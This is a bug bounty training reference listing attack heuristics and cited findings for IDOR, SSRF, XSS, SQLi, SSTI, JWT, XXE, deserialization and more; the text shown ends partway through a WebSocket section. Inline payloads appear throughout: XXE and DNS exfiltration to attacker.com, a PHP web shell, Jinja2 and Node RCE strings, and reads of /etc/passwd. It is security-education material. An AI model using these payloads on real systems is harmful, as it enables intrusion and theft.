# 🧠 SUPER SAIYAN — COMPLETE MIND TRAINING
## 159 Vulnerability Classes — Pattern Recognition from Real Bug Bounty Reports (2025-2026)

> Train your brain to think like a bug bounty hunter. Each Mind Training section gives you:
> **The Trigger** → What to look for | **The Pattern** → What real hunters found | **The Payout** → What it's worth

---

## 📋 HOW TO USE THIS REFERENCE

1. **Before a hunt** — Scan the TOC, pick 2-3 classes to focus on
2. **During a hunt** — When you see a scenario, check the relevant Mind Training
3. **After a finding** — Use the validation patterns to confirm exploitability
4. **Daily drills** — Read 5 Mind Training entries per day to build pattern recognition

---

## CATEGORY A: 🏆 CORE HIGH-VALUE WEB (Pays $1K-$30K+)

These are the classes that consistently pay out. Master these first.

---

### 3.1 IDOR — Insecure Direct Object Reference

**Mind Training — Patterns from Real Bugs ($500-$12.5K):**

1. **"If there's a UUID, it's not safe — find where UUIDs are leaked to other users"**
   → PayPal $10.5K: IDOR in business user management API — leaked UUIDs in team member listings made every user enumerable

2. **"If a GraphQL query takes an ID, try replacing it with another user's ID"**
   → HackerOne $12.5K: `CreateOrUpdateHackerCertification` mutation had zero ownership check

3. **"If price/quantity is in the request, change it"**
   → Acronis: IDOR → price manipulation ($1.4M potential loss)

4. **"If you can list items, you can probably access someone else's"**
   → TikTok $500: IDOR on ads product addition — listing endpoint lacked auth

5. **"Check new features first — they usually lack auth checks"**
   → HackerOne: IDOR in unreleased Copilot feature (shipped without ownership checks)

6. **"Mobile apps often have undocumented IDOR endpoints"**
   → Reverse engineer mobile API — they often use older, less secure API versions

7. **"IDOR + Passwordless auth = instant ATO"**
   → Ziad Abdo (2026): Changed victim's email via IDOR in passwordless (magic link) system → full ATO

8. **"Never stop at read — test write mutations too"**
   → Mohamed Fares (2026): Changed one `admin_id` parameter → took over entire organization owner account

9. **"Check for sequential IDs in unexpected places"**
   → Intigriti CTF May 2026: Sequential session IDs allowed cross-user XSS trigger

10. **"The UI says 'not customizable' — the API might disagree"**
    → Test every field the API accepts, even if the frontend blocks it

---

### 3.2 SSRF — Server-Side Request Forgery

**Mind Training — Patterns from Real Bugs ($1K-$17.5K):**

1. **"Any URL the server fetches = SSRF opportunity"**
   → Dropbox $17.5K: Full Response SSRF via Google Drive API integration

2. **"Image processing pipelines are gold — FFmpeg, ExifTool, ImageMagick"**
   → TikTok $2.7K: FFmpeg HLS processing → SSRF + LFI

3. **"SVG upload = XXE which often = SSRF"**
   → Zivver: SVG XXE → SSRF pivot to internal network

4. **"Webhooks are designed to send HTTP requests — abuse this"**
   → GitLab $10K: DNS rebinding in webhook URL → internal network access

5. **"Sentry misconfig = blind SSRF to internal services"**
   → HackerOne $3.5K: Sentry DSN endpoint allowed blind SSRF

6. **"Check OAuth/SAML integrations — they often fetch URLs"**
   → GitLab $4K: OAuth Jira controller — unauthenticated SSRF

7. **"Response time side-channels reveal internal services"**
   → Skyer (2025): Used `X-Envoy-Upstream-Service-Time` header timing to detect valid internal domains

8. **"CloudFront/S3 wildcard subdomains bypass domain allowlists"**
   → Skyer (2025): Found `*.cloudfront.net` was whitelisted → deployed own subdomain → full SSRF exploitation

9. **"Kubernetes internal services exposed via SSRF"**
   → Skyer (2025): Found `svc.cluster.local` patterns → enumerated 172.31.0.0/16 → millions of user records

10. **"Blind SSRF? Use timing + response size for port scanning"**
    → Different internal services return different response sizes and timing
    → MySQL (3306) vs HTTP (8080) vs Redis (6379) are distinguishable

---

### 3.3 XSS — Cross-Site Scripting

**Mind Training — Patterns from Real Bugs ($500-$20K):**

1. **"WAFs fail open on large request bodies"**
   → Jorge Cerezo (2026): Inflated request body with zeros → WAF stopped inspecting → XSS stored

2. **"HTML entities decoded client-side before innerHTML = XSS"**
   → Jorge Cerezo (2026): `<svg onload=alert(1)>` encoded as entities → decoded by jQuery before DOM insertion

3. **"20 character limit? Use window.name for the real payload"**
   → Jorge Cerezo (2026): Stored 20 char payload → bridged to full JS through `window.name`

4. **"Self-XSS + Login CSRF = Stored XSS on victim"**
   → Jorge Cerezo (2026): OAuth state param missing → forced victim into attacker's session → rendered attacker's stored XSS

5. **"Cookie bomb preserves OAuth codes for theft"**
   → Jorge Cerezo (2026): Set hundreds of KB of cookies scoped to `/oauth/callback` path → blocked code consumption → stole code from URL

6. **"DOM clobbering bypasses DOMPurify"**
   → Intigriti CTF Mar 2026: `<form name="authConfig">` clobbered `window.authConfig` → cookie theft via gadget

7. **"dangerouslySetInnerHTML in React = XSS gold"**
   → Priyansh (2026): Search term reflected into JSON-LD via `dangerouslySetInnerHTML` → CSP bypass

8. **"CDN/file storage origin XSS → useless alone, deadly when chained"**
   → Ahmad Mugh33ra (2026): SVG XSS on cloud.storage origin → found main app stored localStorage (no HttpOnly) → admin takeover

9. **"CSP bypass via <meta refresh> — CSP doesn't block HTML directives"**
   → Xibo CVE-2026-42558: Sandbox escape via `postMessage` → `<meta http-equiv="refresh">` → CSP couldn't block it

10. **"innerHTML doesn't execute scripts, but <iframe srcdoc> does"**
    → pretalx CVE-2026-41241 $8.7 CVSS: Stored XSS via iframe srcdoc bypassed innerHTML + CSP → full ATO

11. **"Upload .js files as 'lecture materials' → same-origin script execution"**
    → pretalx CVE-2026-41241: No file-type restriction → uploaded .js → served from same origin → bypassed `script-src 'self'`

12. **"JSONP endpoints + callback parameter = CSP bypass gadget"**
    → Intigriti CTF Mar 2026: Used `/api/stats?callback=Auth.loginRedirect` to load same-origin JS

13. **"Out-of-scope XSS + in-scope CORS misconfig = data theft"**
    → Asif Ebrahim (2026): Reflected XSS on out-of-scope domain → CORS reflected any origin on in-scope → cross-origin authenticated data theft

14. **"Microsoft paid $912,300 in XSS bounties (2024-2025) — 970+ cases"**
    → MSRC: XSS is still the #1 reported vuln class at Microsoft
    → Highest single bounty: $20,000

---

### 3.4 SQL Injection

**Mind Training — Patterns from Real Bugs ($1K-$15K):**

1. **"SQLi has moved — not in forms anymore, it's in API params, GraphQL, and mobile endpoints"**
   → RedfoxSec 2026: Modern SQLi lives in sort params, filters, order_by, and mobile API

2. **"ORDER BY injection is the new frontier — whitelists rarely cover it"**
   → Perfex CRM CVE (2026): `sort_by` param injected directly into ORDER BY → blind time-based extraction of admin password hash

3. **"CTE (WITH clause) bypasses SQL validators"**
   → gh0stfqce (2026): `WITH d AS (SELECT * FROM system.users) SELECT * FROM d` — validator only checked outer FROM clause

4. **"Out-of-Band SQLi via DNS still works — xp_dirtree on MSSQL"**
   → NullSecurityX (2026): Used `xp_dirtree` + string splitting to bypass character limits → DNS exfil of DB_NAME, SYSTEM_USER

5. **"Character limits? Split strings with + operator"**
   → NullSecurityX: Payload truncated at 99 chars → split with `'\\\\'+'concat'+'enation'` pattern

6. **"Error-Based SQLi in GraphQL WebSocket = critical escalation"**
   → Ahmed Ghadban (2026) $2K: Error-based PostgreSQL injection in GraphQL WebSocket → leaked 25-digit document IDs → IDOR on documents

7. **"Second-Order SQLi: input transformed (lowercased, quotes escaped) → stored → executed unsanitized"**
   → Omar Elshopky (2026): Second-order SQLi → used dollar-quoting `$$` to bypass quote filters → `COPY FROM PROGRAM` → RCE

8. **"Numeric filters bypassed with sed reconstruction"**
   → Omar Elshopky (2026): Numeric characters were replaced by `?` → prepended `f` before each number → piped through `sed 's/f//g'` server-side

9. **"WAF keyword detection? Use comment fragmentation + encoding"**
   → SQLi detection has evolved past string matching — semantic analysis defeats comment injection

10. **"AI-discovered SQLi: Claude found CVE-2026-26980 in Ghost CMS (CVSS 9.4)"**
    → Blind SQLi in Content API → extracted Admin API keys → mass ClickFix exploitation campaign across 700+ sites

---

### 3.5 ATO — Account Takeover

**Mind Training — Patterns from Real Bugs ($1K-$35K):**

1. **"Unbound flow tokens = zero-click ATO"**
   → r3verii (2025) €3.5K: OTP_TOKEN not bound to accountId → validate OTP for own account → reset victim's password

2. **"Missing link between authenticate and execute = ATO"**
   → BelScarabX (2026): Password change had "authenticate" step then "set" step — but no token linking them → skip authenticate entirely

3. **"IDOR to change email + passwordless auth = instant ATO"**
   → Ziad Abdo (2026): PUT /api/user/{id} accepted attacker JWT + victim ID → changed victim's email → requested magic link → full takeover

4. **"Type coercion: email field accepts array"**
   → GitLab $35K (H1 #2293343): `user[email]` accepted JSON array → password reset email sent to attacker-controlled address too

5. **"Stored XSS → localStorage theft → ATO (no HttpOnly cookies)"**
   → Ahmad Mugh33ra (2026): SVG XSS on cloud domain + auto-save field XSS on main domain → stole localStorage clientId/refreshToken

6. **"One parameter change: admin_id to change owner password"**
   → Mohamed Fares (2026): Full Access user → changed admin_id in profile update to owner's ID → added `admin_password_new` → owned organization

7. **"PII disclosure + predictable userId pattern = mass ATO"**
   → Alareqi (2026): Unauthenticated product API leaked seller PII → userId = email prefix → automated password reset for thousands

8. **"WAF bypass via Host header injection"**
   → Alareqi (2026): Cloudflare WAF blocked supplier domain → sent request to API gateway with `Host: supplier.domain` → bypassed WAF

9. **"Password reset token in URL → leaked via Referer"**
   → Classic but still works: reset links with tokens in URL params sent to external resources leak via Referer header

10. **"Race condition + old session after MFA enable = MFA bypass ATO"**
    → Send MFA enable request + simultaneously use old unauthenticated session → session still valid

---

### 3.6 Business Logic

**Mind Training — Patterns from Real Bugs ($500-$10K):**

1. **"No scanner finds these — you must understand the business process"**
   → Business logic flaws are DESIGN flaws, not code flaws

2. **"Negative quantities, fractional numbers, null prices — always try edge cases"**
   → `{"qty": -1}` returns money? `{"price": null}` = free? `{"qty": 0.5}` = half price?

3. **"Skip steps in multi-step flows — go directly to /checkout/success"**
   → Payment flow: step 1 add cart → step 2 payment → step 3 confirm → try step 3 directly

4. **"Race conditions amplify business logic flaws 10x"**
   → Apply same coupon 50x simultaneously → 50x discount

5. **"Email+ trick: email+1@domain.com → unlimited free trials"**
   → Gmail's + alias creates infinite unique emails that all deliver to the same inbox

6. **"Currency manipulation: change USD to ZWL (Zimbabwe dollar)"**
   → If prices are stored in one currency but displayed in another, the conversion might work in your favor

7. **"Self-referral: refer yourself → get bonus"**
   → No check that referrer and referee are different accounts

8. **"Downgrade plan → keep premium features"**
   → Cancel subscription → check if premium features remain active (no cleanup on cancellation)

---

### 3.7 Race Conditions / TOCTOU

**Mind Training — Patterns from Real Bugs ($500-$5K):**

1. **"HTTP/2 single-packet attack eliminates network jitter"**
   → James Kettle (PortSwigger): Bundle requests in single TCP packet → all arrive simultaneously at server

2. **"TOCTOU between file check and file read = arbitrary file read"**
   → n8n CVE (2026): Symlink changed between `fsAccess` check and `createReadStream` → read any file → database stolen → JWT forged → 0-click ATO

3. **"Git branches as TOCTOU primitive: switch symlink targets via git checkout"**
   → n8n exploit: Git repo with symlink pointing to `/etc` in main branch, `/home/node` in second → rapid branch switching

4. **"Vote/review/like race: send 20 parallel requests, bypass 'one per user' restriction"**
   → Md Tanjimul Islam (2026): Single-packet attack on review API → 20 reviews created simultaneously

5. **"workflow_dispatch TOCTOU in GitHub Actions"**
   → Adnan Khan (2025): PR approved → workflow checks out PR → attacker pushes new code in 19s window → backdoored Dependabot containers

6. **"Coupon race: apply 50x in parallel, get 50 discounts"**
   → Turbo Intruder with last-byte sync → all 50 requests pass validation before any write completes

7. **"DB-level constraints are the only fix — app-level checks always have TOCTOU window"**
   → `CREATE UNIQUE INDEX` prevents race conditions; `if (!exists) { insert }` does not

---

### 3.8 SSTI — Server-Side Template Injection

**Mind Training — Patterns from Real Bugs ($2K-$30K):**

1. **"Never jump to RCE payloads before fingerprinting the engine"**
   → Jinja2: `{{7*'7'}}` = `7777777` (string repeat) | Twig: `{{7*'7'}}` = `49` (numeric) — this single test differentiates them

2. **"Error-based SSTI discovery: malformed syntax changes HTTP status codes"**
   → Vladko312 (2026): Send deliberately malformed syntax → 500 on Jinja2, different error on Twig — even blind SSTI reveals engine

3. **"Blind SSTI detection via sleep + timing"**
   → `{{config.__class__.__init__.__globals__['os'].popen('sleep 5')}}` → consistent 5s delay = SSTI confirmed

4. **"Thymeleaf SSTI via TAB character (0x09) bypass — CVE-2026-40478 (CVSS 9.1)"**
   → Dawid Bakaj (2026): TAB char bypassed SpEL keyword scanner in Thymeleaf → RCE on Spring Boot

5. **"Jinja2 MRO chain: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`**
   → Walk Python's MRO from any object → reach `os` module → RCE

6. **"SSTI pays 10x comparable XSS — Critical always"**
   → CVSS 9.8 is defensible for SSTI with confirmed RCE

---

### 3.9 File Upload

**Mind Training — Patterns from Real Bugs ($500-$5K):**

1. **"SVG upload = XSS + XXE + SSRF in one"**
   → SVG supports `<script>`, XML entities (XXE), and external resources (SSRF)

2. **"Double extension: shell.php.jpg — Apache mod_mime executes .pHP.jpg"**
   → Apache parses from right: `.jpg` but executes `.php.jpg` if mod_mime misconfigured

3. **".htaccess upload = game over"**
   → Upload `.htaccess` with `AddType application/x-httpd-php .txt` → next upload `shell.txt` = PHP execution

4. **"Magic byte bypass: GIF89a header + PHP payload"**
   → Content-type check reads magic bytes → `GIF89a<?php system($_GET['cmd']); ?>` passes image check

5. **"Upload JS file as 'lecture materials' → same-origin XSS"**
   → pretalx CVE-2026-41241: No file-type restriction on resource upload → `.js` file served from same origin → bypassed CSP `script-src 'self'`

---

### 3.10 GraphQL

**Mind Training — Patterns from Real Bugs ($1K-$12.5K):**

1. **"Introspection enabled = full schema handed to attacker"**
   → Krishna Kumar (2026) $12.5K: Introspection on fintech API → found `getTransaction(id)` → IDOR on all transactions → batch query exfil

2. **"Alias batching bypasses rate limits: 50 login attempts in 1 HTTP request"**
   → Rate limiter sees 1 request; authentication system sees 50 attempts

3. **"Alias batching scales IDOR: enumerate 200 user IDs in one query"**
   → `u1: user(id:1){email} u2: user(id:2){email} ... u200: user(id:200){email}`

4. **"Array batching for mutations: change 3 users' roles in one request"**
   → CANITEY (2026): Sent JSON array of mutations → changed unlimited users to EDITOR role, bypassing plan limits

5. **"WebSocket GraphQL often has weaker auth than HTTP"**
   → Ahmed Ghadban (2026) $2K: Keep-alive WebSocket hid full GraphQL surface → SQL injection via hidden mutation

6. **"Resolver-level auth is optional by default — every resolver must check authorization"**
   → Most frameworks don't enforce field-level auth — you must implement it per resolver

7. **"Depth + complexity limits prevent DoS — always test if they're missing"**
   → Recursive query (user → posts → comments → author → posts → ...) creates exponential load

---

### 3.11 JWT Attacks

**Mind Training — Patterns from Real Bugs ($1K-$20K):**

1. **"alg: none still works on legacy/hand-rolled implementations"**
   → Change header to `{"alg":"none"}`, remove signature → server skips verification

2. **"RS256 → HS256 confusion: sign with server's PUBLIC key as HMAC secret"**
   → Find public key at `/.well-known/jwks.json` → change header to `HS256` → sign token with public key string

3. **"JKU injection: point jku header to attacker's JWKS endpoint"**
   → Host your own JWKS → set `"jku":"https://evil.com/jwks.json"` → server fetches your keys

4. **"kid injection: path traversal → use /dev/null as signing key"**
   → Set `"kid":"../../../dev/null"` → server reads empty file → sign JWT with empty secret

5. **"kid injection: SQLi → UNION SELECT returns attacker-controlled secret"**
   → `"kid":"x' UNION SELECT 'pwned_secret' -- "` → server uses `pwned_secret` to verify → sign JWT with that

6. **"Empty HMAC secret in async key resolver → `fast-jwt` CVE-2026 (auth bypass)"**
   → `keys[decoded.header.kid] || ''` when kid unknown → empty string as HMAC secret → forge any JWT

7. **"JWE + PlainJWT confusion: CVE-2026-29000 (CVSS 10.0)"**
   → pac4j-jwt: JWE-wrapped unsigned JWT bypasses signature verification → forge token with only RSA public key

8. **"Crack weak HMAC secrets offline with hashcat"**
   → `hashcat -m 16500 jwt.txt rockyou.txt` — weak secrets crack in minutes

---

### 3.12 Prototype Pollution

**Mind Training — Patterns from Real Bugs:**

1. **"`__proto__` assignment pollutes all objects — look for recursive merge, assign, or clone"**
   → `$.extend(true, {}, JSON.parse(userInput))` is vulnerable — pollute `__proto__` → affects all objects

2. **"Server-side prototype pollution (SSPP) is more dangerous than client-side"**
   → Node.js merges user JSON into config → `{"__proto__":{"admin":true}}` → bypass auth globally

3. **"Pollution → SSTI chain: pollute default template context → template injection"**
   → In Handlebars/Nunjucks: prototype pollution can inject into template rendering context

4. **"client-side PP: pollute `Object.prototype` → all objects get polluted property"**
   → `{"__proto__":{"isAdmin":true}}` → every object now has `isAdmin = true`

5. **"Check for `constructor.prototype` as alternative to `__proto__`"**
   → Some sanitizers block `__proto__` but miss `constructor.prototype`

---

### 3.13 HTTP Request Smuggling

**Mind Training — Patterns from Real Bugs ($5K-$30K):**

1. **"CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding"**
   → Send both: front-end reads CL → sends full body, back-end reads TE → first chunk = smuggled request

2. **"TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length"**
   → Reverse of above — front-end processes chunks, back-end reads CL

3. **"HTTP/2 downgrade smuggling: H2.CL"**
   → HTTP/2 request → front-end downgrades to HTTP/1.1 → smuggling possible

4. **"Smuggling bypasses WAF, auth, and rate limiting"**
   → Malicious request hidden inside legitimate request → WAF never sees it

5. **"Time-based detection: send request with deliberately slow body — observe response timing"**
   → If response comes before body fully sent → CL.TE likely

---

### 3.14 Subdomain Takeover

**Mind Training — Patterns from Real Bugs ($200-$5K):**

1. **"CNAME to unclaimed cloud service = free subdomain"**
   → GitHub Pages, S3, Heroku, Netlify, AWS CloudFront, Azure, Shopify, Zendesk

2. **"DNS record exists but service returns 404/NXDOMAIN"**
   → `dig CNAME sub.target.com` — if CNAME exists but target service errors out → takeover

3. **"Takeover for OAuth redirect_uri = steal OAuth codes"**
   → Host a page on claimed subdomain → complete OAuth flow → capture victim's auth code

4. **"Mass scanning: nuclei templates can find thousands in large programs"**
   → `nuclei -l live.txt -tags takeover` — automated mass takeover detection

5. **"Broken link hijacking (3.156): social media links to expired profiles"**
   → Claim the username on Twitter/LinkedIn/GitHub → whoever clicks the link sees your profile

---

### 3.15 XXE — XML External Entity

**Mind Training — Patterns from Real Bugs:**

1. **"SVG upload = XXE vector"**
   → `<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`

2. **"Blind XXE: OOB exfiltration via parameter entities"**
   → `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">%eval;%exfil;`

3. **"XXE → SSRF → RCE chain"**
   → Read file first → identify internal services (Jenkins, Solr, etc.) → SSRF to exploit them

4. **"DOCX/XLSX/PPTX upload: these are ZIP files containing XML — XXE in office documents"**
   → Modify XML inside office document → server parses on upload → XXE triggers

5. **"Modern JSON APIs may still parse XML — check Content-Type switching"**
   → Change `Content-Type: application/json` → `application/xml` → server might parse XML on same endpoint

---

## CATEGORY B: 🔐 AUTHENTICATION & SESSION

---

### 3.16 Open Redirect

**Mind Training — Patterns from Real Bugs:**

1. **"OAuth redirect_uri abuse = steal auth codes"**
   → Redirect victim to attacker's domain after OAuth → `?code=` in URL → attacker captures it

2. **"11 bypass techniques: double-slash, @ symbol, \\, ?# confusion"**
   → `https://trusted.com@evil.com`, `//evil.com`, `https://trusted.com.evil.com`

3. **"Open redirect alone is rarely paid — chain it for impact"**
   → Alone = Informational. Chained with OAuth/OIDC = Critical.

4. **"`/\/evil.com` bypasses protocol checks"**
   → Some filters check for `http://` — but `/\/evil.com` is valid URL in some parsers

5. **"`?url=javascript:alert(1)` — protocol handler XSS"**
   → If redirect doesn't check scheme, `javascript:` protocol → XSS

---

### 3.17 CORS Misconfiguration

**Mind Training — Patterns from Real Bugs:**

1. **"Origin reflection: `Access-Control-Allow-Origin: https://evil.com`"**
   → Server echoes back whatever Origin header you send → any site can make authenticated requests

2. **"Null origin bypass: sandboxed iframe → `Origin: null`"**
   → `Access-Control-Allow-Origin: null` — create sandboxed iframe from `data:` URI → origin is null

3. **"Preflight + credentials = worst case"**
   → `Access-Control-Allow-Credentials: true` + reflected origin = complete cookie theft

4. **"CORS + XSS on any allowed origin = data theft chain"**
   → Asif Ebrahim (2026): Reflected XSS on out-of-scope domain + CORS with credentials on in-scope = cross-origin authenticated data theft

5. **"Wildcard origin with credentials = `Access-Control-Allow-Origin: *` but `Allow-Credentials: true`? Browsers block this"**
   → But `Origin: null` + `Allow-Credentials: true` works in some browsers

---

### 3.18 Template Injection in OAuth/SAML

**Mind Training — Patterns from Real Bugs:**

1. **"OAuth redirect_uri rendered in template engine = SSTI"**
   → If redirect_uri is embedded in a template before redirect, SSTI possible

2. **"SAML NameID parsed by template engine → SSTI"**
   → NameID from SAML response goes through template → malicious NameID = code execution

3. **"Email templates with user-controlled name = SSTI"**
   → Welcome email: `Hello {{name}}` — if name is `{{7*7}}` and NOT escaped → SSTI

4. **"Test with `{{7*7}}` everywhere user-controlled data is rendered server-side"**
   → Not just visible pages — emails, PDFs, CSV exports, admin dashboards

---

### 3.19 NoSQL Injection (MongoDB)

**Mind Training — Patterns from Real Bugs:**

1. **"JSON body: `{"username":"admin","password":{"$gt":""}}`"**
   → MongoDB `$gt` operator matches any string greater than empty — bypasses password check

2. **"`$ne`: `{"username":{"$ne":""},"password":{"$ne":""}}`"**
   → `$ne` (not equal) matches any non-empty value — logs in as first user found

3. **"`$regex`: extract data character by character"**
   → `{"username":{"$regex":"^a.*"}}` → if match → true → blind extraction

4. **"URL params: `?username=admin&password[$gt]=`"**
   → Express/qs parser converts `password[$gt]=` into nested object — NoSQL injection via URL params

5. **"Check for `$where` operator — JavaScript injection"**
   → `{"$where":"sleep(5000)"}` or `{"$where":"1==1"}` — arbitrary JS execution on DB

---

### 3.20 CSRF — Cross-Site Request Forgery

**Mind Training — Patterns from Real Bugs:**

1. **"Missing CSRF token on state-changing requests = CSRF"**
   → POST/PUT/DELETE that changes email, password, role, etc. without token

2. **"CSRF token validation only on some endpoints = partial coverage"**
   → Login has CSRF, but password reset doesn't? → chain for ATO

3. **"SameSite=Lax bypass via POST + top-level navigation"**
   → SameSite=Lax only blocks cross-site for unsafe methods — but POST + form submit works

4. **"Login CSRF: force victim to log into attacker's account"**
   → OAuth state parameter missing → attacker initiates login flow → victim lands on attacker's account → attacker's stored XSS executes

5. **"JSON endpoints need CSRF too — `Content-Type: application/json` doesn't prevent browser auto-submit"**
   → But older browsers allow form with `enctype=text/plain` to send JSON

---

### 3.21 Command Injection

**Mind Training — Patterns from Real Bugs:**

1. **"Parameters passed to shell functions: `exec()`, `system()`, `popen()`, `shell_exec()`, `subprocess.run(shell=True)`"**
   → Any user input reaching these = RCE

2. **"Detection: `;id`, `|id`, `$(id)`, `` `id` ``, `&id&`"**
   → Try each separator: `;`, `|`, `||`, `&`, `&&`, `$()`, `` `` ``

3. **"DNS exfil for blind command injection"**
   → `; nslookup $(whoami).attacker.com` — command output goes via DNS

4. **"Input appears in filenames, process names, or log entries"**
   → `ping -c 1 $input`, `grep $input /var/log/`, `ffmpeg -i $input`

5. **"WAF bypass: use `$@` or `$0` or `${IFS}` instead of spaces"**
   → `cat${IFS}/etc/passwd` bypasses space-based filters

---

### 3.22 Path Traversal / LFI

**Mind Training — Patterns from Real Bugs:**

1. **"Parameters: `?file=`, `?page=`, `?load=`, `?template=`, `?include=`, `?document=`"**
   → Classic LFI parameters

2. **"Bypass techniques: `....//`, `%2e%2e%2f`, `..%252f` (double URL encoding)"**
   → `....//etc/passwd` (filter removes `../` but `....//` becomes `../` after removal)

3. **"PHP wrappers for RCE: `php://filter/convert.base64-encode/resource=index.php`"**
   → Read source code via base64 encoding → `php://input` with POST body → code execution

4. **"Windows bypass: `..\..\windows\win.ini`"**
   → Path traversal on Windows uses backslash

5. **"Null byte injection: `../../../etc/passwd%00.jpg`"**
   → PHP < 5.3.4: null byte truncates `.jpg` extension → still works on some targets

---

### 3.23 Insecure Deserialization

**Mind Training — Patterns from Real Bugs:**

1. **"PHP: `unserialize()` on user input = RCE gadget chain"**
   → `O:14:"PHPObjectInjection":1:{s:5:"username";s:5:"admin";}` — object instantiation from serialized data

2. **"Java: `readObject()` on user input = RCE via ysoserial"**
   → `ysoserial Groovy1 "curl http://attacker.com" | base64` — known gadget chains

3. **"Python pickle: `pickle.loads(user_input)` = RCE"**
   → `__reduce__` method executed on unpickling — define `__reduce__` to call `os.system`

4. **"Node.js: `node-serialize` or `serialize-javascript` with IIFE"**
   → `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(){})()}"}`

5. **"Look for base64, hex, or custom-encoded serialized data in cookies, hidden fields, or tokens"**
   → Java serialized data starts with `rO0`, PHP with `a:1:{`, Python pickle with `(dp0`

---

### 3.24 Mass Assignment / Auto-Binding

**Mind Training — Patterns from Real Bugs:**

1. **"Extra JSON fields in request body get bound to model"**
   → `{"name":"test","role":"admin","isAdmin":true,"balance":999999}` — if these fields exist on the model, they're assigned

2. **"Ruby on Rails: `params.permit!` or `User.new(params[:user])`"**
   → Strong Parameters missing → attacker adds `admin: true` to registration

3. **"Node.js/Mongoose: `User.create(req.body)` without whitelisting"**
   → Any field in the request body gets saved to the database

4. **"Laravel: `$user->fill($request->all())`"**
   → Without `$fillable` or `$guarded` — attacker sets `is_admin = true`

5. **"Test: add unexpected fields (role, isAdmin, verified, email_verified_at, balance) to every mutation/update"**
   → The fields that don't exist in the frontend are the most interesting

---

### 3.25 Host Header Injection

**Mind Training — Patterns from Real Bugs:**

1. **"Password reset link generated with attacker's Host → reset link sent to attacker"**
   → `POST /forgot-password` with `Host: attacker.com` → reset link: `https://attacker.com/reset?token=abc`

2. **"Cache poisoning: Host header used in cache key — attacker's Host poisons cache for all users"**
   → `Host: evil.com` → cache stores page with evil.com URLs → serve to other users

3. **"Web cache poisoning via unkeyed Host"**
   → If Host is not in cache key → attacker can poison with arbitrary Host

4. **"Routing-based SSRF: Host used to determine backend server"**
   → `Host: internal.admin.com` → request routed to internal network

5. **"Bypass: `X-Forwarded-Host: evil.com` — sometimes overrides Host"**
   → Some servers trust XFH over Host header

---

### 3.26 Web Cache Poisoning / Cache Deception

**Mind Training — Patterns from Real Bugs:**

1. **"Cache deception: request `/settings.css` instead of `/settings` — CDN caches the CSS, returns settings page to others"**
   → Path confusion: append `.css` to sensitive URL → cache stores and serves to others

2. **"Unkeyed header poisoning: `X-Forwarded-Host`, `X-Forwarded-Scheme`, cookie"**
   → If these aren't in the cache key → attacker poisons the cache

3. **"Param poisoning: `?cb=123` — if cb is unkeyed but affects content"**
   → Fuzz for parameters that change response content but aren't in cache key

4. **"Cookie-based poisoning: attacker sets cookie → cache stores personalized content → serves to others"**
   → e.g., `X-User-Id` cookie changes response but is unkeyed

5. **"Cache key analysis: `Cache-Control: public`, `Age` header, `X-Cache: hit`"**
   → Check for caching on dynamic responses with sensitive data

---

### 3.27 Information Disclosure

**Mind Training — Patterns from Real Bugs:**

1. **"Stack traces in error responses = full tech stack disclosure"**
   → Trigger errors with malformed input → read stack traces → find framework, version, file paths

2. **"Directory listing enabled: `.git/config`, `.env`, `backup/`"**
   → Fuzz for common sensitive paths

3. **"`/.git` disclosure = full source code"**
   → `curl https://target.com/.git/config` → if accessible, download entire repo via `git-dumper`

4. **"Debug endpoints: `/debug`, `/actuator`, `/console`, `/phpinfo.php`"**
   → Spring Actuator, Laravel Debugbar, Django debug toolbar

5. **"Version disclosure in headers: `Server: Apache/2.4.49`, `X-Powered-By: PHP/8.1`"**
   → Version-specific CVE search

6. **"PII in API responses that shouldn't be there"**
   → `/api/users/me` might return everyone's data, not just current user

---

### 3.28 OAuth 2.0 / OIDC Misconfiguration

**Mind Training — Patterns from Real Bugs ($500-$5K):**

1. **"Missing state param = CSRF on OAuth flow"**
   → Attacker initiates OAuth → victim clicks → victim's account linked to attacker's social profile

2. **"redirect_uri validation bypass: open redirect, path traversal, wildcard"**
   → `https://app.com/oauth/callback?redirect=//evil.com` — loopback allowed

3. **"PKCE downgrade: OAuth provider doesn't enforce PKCE → auth code interception"**
   → Without PKCE, anyone with the authorization code can exchange it for tokens

4. **"Code injection: intercept OAuth code → use on different account/client"**
   → OAuth code not bound to specific client → reuse on attacker's app

5. **"Scope escalation: request `admin` scope instead of `user.email`"**
   → If authorization server doesn't validate scope against client registration

---

### 3.29 2FA / MFA Bypass

**Mind Training — Patterns from Real Bugs ($1K-$10K):**

1. **"Navigate directly to dashboard after login — skip MFA"**
   → Some apps only enforce MFA on the MFA page, but `/dashboard` has no check

2. **"Reuse old session after MFA enabled"**
   → Session created before MFA → still valid after MFA enabled → no re-authentication required

3. **"OTP brute force: 4-6 digit codes with no rate limit"**
   → 0000-9999: 10,000 attempts — without rate limit, takes minutes

4. **"OTP reuse: same OTP works for multiple verifications"**
   → OTP should be single-use — test if same OTP validates twice

5. **"Backup codes have no usage limit"**
   → Backup code intended for single use → can be used repeatedly

6. **"Response manipulation: change `"mfa_required": true` to `false`"**
   → Client-side MFA enforcement → intercept response → bypass

---

### 3.30 Clickjacking

**Mind Training — Patterns from Real Bugs:**

1. **"Missing `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`"**
   → Page can be loaded in an iframe → overlay transparent iframe over fake UI

2. **"Valid when combined with social engineering (e.g., 'Click to win prize')"**
   → Alone = Informational. With specific UI overlay = Medium

3. **"Widget/widgets/embeddable endpoints are most likely to be clickjackable"**
   → Intentionally embeddable content often lacks frame protection

4. **"Test: `curl -I https://target.com | grep -i X-Frame-Options`"**
   → If missing, test with HTML that loads target in iframe

---

## CATEGORY C: 🕸️ ADVANCED WEB & PROTOCOL

---

### 3.31 WebSocket Attacks

**Mind Training — Patterns from Real Bugs:**

1. **"WebSocket auth often weaker than HTTP API auth"**
   → WebSocket handshake may auth, but subsequent messages don't re-validate

2. **"Test for SQL/NoSQL injection in WebSocket messages — parsers differ"**
   → Same payloads as HTTP but WebSocket message parsing may have different escaping

3. **"Cross-Site WebSocket Hijacking (3.59): no `Origin` check on WebSocket upgrade"**
